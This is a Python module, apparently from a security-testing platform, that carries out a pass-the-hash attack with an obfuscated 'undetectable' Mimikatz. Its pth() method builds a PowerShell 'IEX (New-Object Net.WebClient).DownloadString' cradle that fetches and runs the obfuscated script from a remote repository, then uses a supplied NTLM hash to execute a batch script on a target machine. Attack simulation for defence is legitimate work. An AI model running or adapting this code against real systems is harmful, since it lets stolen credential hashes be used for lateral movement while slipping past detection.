from ai_utils.utils.offensive.pass_the_hash.abstract_pth import AbstractPassTheHashAgent
from ai_utils.utils.offensive.pass_the_hash.undetectable_mimikatz.undetectable_mimikatz_reporter import UndetectableMimikatzReporter
from ai_utils.utils.offensive.pass_the_hash.undetectable_mimikatz.undetectable_mimikatz_parser import UndetectableMimikatzParser
from ai_utils.utils.offensive.pass_the_hash.undetectable_mimikatz.undetectable_mimikatz_setup import UndetectableMimikatzSetup
from ai_utils.utils.offensive.powershell import PowershellUtilsClass
from ai_utils.scenarios.globals import FileUtils
import logging
import re

try:
  # noinspection PyUnresolvedReferences
  import aipythonlib
except Exception as e:
  logging.error('Error importing aipythonlib: {0}'.format(e))


class UndetectableMimikatzAgent(AbstractPassTheHashAgent):
  """
  This utility will execute Mimikatz in order to pass the hash to a remote system. The command that is executed
  is "privilege::debug sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:"<batch_file>".

  In order to identify if PtH was successful, it will execute a batch script. The output of this batch script will
  be stored in a file. Afterwards, the content of such file will be check for a success pattern. If this pattern is
  stored in the file, PtH was successful.

  :param password_hash (str): The NTLM hash that will be used to pass the hash
  :param username (str): The account username that will be used to pass the hash
  :param fqdn (str): The Windows domain name that will be used to pass the hash
  :param remote_command_script (str): The path to the batch script that will be executed in the remote system.
    This script has to print the `test_success_pattern` to the screen (echo) and it will be automatically stored
    in the `command_log_path` file
  :param command_log_path (str): The path to the log file that the `remote_command_script` will generate
  :param test_success_pattern (str): The pattern to look for in the `command_log_path` to check if script execution
    was successful
  :param timeout (int): Timeout in milliseconds for pass the hash
  :param phase_reporter (obj): This object is the PhaseReporter class from the AbstractPhaseClass. It is used to
    print messages to FireDrill UI. If this parameter is none, logging module will be used instead and messages
    will be printed to a log file.
  """

  def __init__(self, password_hash, target_machine='', username='', fqdn='', remote_command_script='', command_log_path='', test_success_pattern='', timeout=120000, phase_reporter=None):
    logging.info('Executing UndetectableMimikatzAgent constructor. password_hash: (redacted), target_machine: {}, username: {}, fqdn: {}, remote_command_script: {}, command_log_path: {}, test_success_pattern: {}, timeout: {}, phase_reporter: {}'. format(target_machine, username, fqdn, remote_command_script, command_log_path, test_success_pattern, timeout, phase_reporter))
    super(UndetectableMimikatzAgent, self).__init__(phase_reporter=phase_reporter)
    self.pth_setup_class = UndetectableMimikatzSetup(phase_reporter)
    self.password_hash = password_hash
    self.timeout = self.pth_setup_class.setup_timeout(timeout)
    self.fqdn = self.pth_setup_class.setup_fqdn(fqdn)
    self.domain = self.pth_setup_class.get_domain_from_fqdn(self.fqdn)
    self.domain_pre_windows2000 = self.domain[:15]
    # target machine with fqdn. e.g. dc01.attackiq.local
    self.target_machine_with_fqdn = self.pth_setup_class.setup_target_machine(target_machine, fqdn=self.fqdn)
    self.username = self.pth_setup_class.setup_user(username)
    if self.fqdn and '@' + self.fqdn.lower() in self.username.lower():  # remove fqdn from username. e.g. administrator
      self.username = self.username.lower().split('@' + self.fqdn.lower())[0]
    self.test_success_pattern = self.pth_setup_class.setup_test_success_pattern(test_success_pattern)
    self.remote_command_output_log_path = self.pth_setup_class.setup_remote_command_output_log_path(command_log_path)
    self.remote_command_script = self.pth_setup_class.setup_remote_command_script(remote_command_script=remote_command_script, remote_machine_name=self.target_machine_with_fqdn, fqdn=self.fqdn, log_file=self.remote_command_output_log_path)
    self.remote_command_output = ''
    self.reporter = UndetectableMimikatzReporter(self.username, self.target_machine_with_fqdn, self.fqdn, self.phase_reporter)

  def setup_pth(self):
    logging.debug('Executing Setup')
    if self.reporter.check_if_critical_failure_and_log_it():
      return False
    if not self.password_hash:
      self.log_error('Password hash parameter was empty and its value could not be retrieved')
      return False
    if not self.target_machine_with_fqdn:
      self.log_error('Target Machine parameter was empty and its value could not be retrieved')
      return False
    if not self.username:
      self.log_error('Username parameter was empty and its value could not be retrieved')
      return False
    if self.fqdn and '@' + self.fqdn.lower() in self.username.lower():
      self.log_error('User name must not include FQDN. Correct: <user>. Incorrect: <user>@<fqdn>')
      return False
    if not self.remote_command_script:
      self.log_error('Remote Command Script parameter was empty and its value could not be retrieved')
      return False
    if not self.remote_command_output_log_path:
      self.log_error('Remote Command Output Log Path parameter was empty and its value could not be retrieved')
      return False
    if not self.test_success_pattern:
      self.log_error('Test Success Pattern parameter was empty and its value could not be retrieved')
      return False
    return True

  def remove_output_log(self):
    logging.debug('Executing remove_output_log')
    return FileUtils.DeleteFile(self.remote_command_output_log_path)

  def remove_script(self):
    logging.debug('Executing remove_script')
    return FileUtils.DeleteFile(self.remote_command_script)

  def pth(self):
    logging.debug('Executing pth')
    timeout = 90000
    mimikatz_cmd = 'sekurlsa::pth /user:{0} /domain:{1} /ntlm:{2} /run:{3}'.format(self.username, self.domain_pre_windows2000, self.password_hash, self.remote_command_script)
    command_line = 'IEX (New-Object Net.WebClient).DownloadString(\'{0}\'); {2}'.format('http://repository.attackiq.net/01a03ea82e5b08352c09e707e1eb967a1b7910a8d3a245af20059f7933d8462e/obf_mim.ps1', mimikatz_cmd, 'AttackIQMimi -Command \'"""{}"""\''.format(mimikatz_cmd))
    redacted_cmd_line = re.sub(r'/ntlm:\s*\w+', '/ntlm:(redacted)', command_line)
    std_out, exit_code = PowershellUtilsClass.ExecutePowerShellCommand(command_line, format='', timeout=timeout, print_output=False)
    self.log_debug('Mimikatz was executed using the following PowerShell command "{}"'.format(redacted_cmd_line))
    if exit_code == 0:
      self.log_info('Undetectable Mimikatz was successfully executed')
      return self.check_pass_the_hash_success()
    else:
      self.log_info('Remote command script could not be executed passing the hash using Undetectable Mimikatz. Check scenario logs to get further details.')
      logging.warning('Commandline: {0}, Exit Code: {1}'.format(redacted_cmd_line, exit_code))
      std_out = ''
    return std_out

  def log_results(self, phase_successful):
    logging.debug('Executing log_results. phase_successful: {}'.format(phase_successful))
    self.reporter.report(phase_successful)

  def check_pass_the_hash_success(self):
    logging.debug('Executing check_pass_the_hash_success')
    parser = UndetectableMimikatzParser(self.remote_command_output_log_path, self.test_success_pattern)
    success, err = parser.parse_pth_output()
    if err:
      self.log_info(err)
    return success
